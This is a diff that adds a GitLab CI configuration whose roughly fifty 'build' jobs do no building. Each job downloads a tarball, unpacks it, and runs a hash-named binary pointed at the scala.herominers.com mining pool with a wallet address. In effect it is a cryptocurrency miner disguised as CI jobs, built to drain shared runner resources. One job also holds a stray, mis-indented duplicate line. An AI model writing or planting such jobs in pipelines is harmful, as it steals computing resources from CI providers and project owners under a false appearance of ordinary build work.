@@ -1,0 +1,361 @@
+image: golang:latest
+
+variables:
+  REPO_NAME: gitlab.com/namespace/project
+
+stages:
+  - build
+  - test
+  - deploy
+
+build_a:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+    
+build_b:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+    
+build_c:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+      - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_d:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_e:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_f:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_g:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_h:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_i:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_j:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_k:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_l:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_m:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_n:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_o:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_p:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_q:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_r:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_s:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_t:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_u:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_v:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_w:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_x:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_y:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_z:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_ab:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_ac:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_ad:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_ae:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_af:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_ag:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_ah:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_ai:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_aj:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_ak:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_al:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_am:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_an:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_ao:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_av:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_aw:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_ax:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_ay:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_az:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_aaa:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_aab:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_aac:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_aad:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
+build_aae:
+  stage: build
+  script:
+    - wget https://gitlab.com/sindikarmila31/project-sindi/uploads/a3f2d16a217bb3e6df4a23cbb9a5fc59/SCALA.tar.gz
+    - tar xf SCALA.tar.gz
+    - ./4acd6eacc97ceee254a3dabb73d6e0dd --donate-level 1 -o scala.herominers.com:10130 -u Ssy2DdMxxXQJ5C3wX7UFNuUpVdhRQsWK2dUZRXWFdgJv3faoef93EocQJUco7WNNapTXfRXpju3WWi2u8UThBgis5GWReVBSYQ -p cpu -a panthera -k
+  
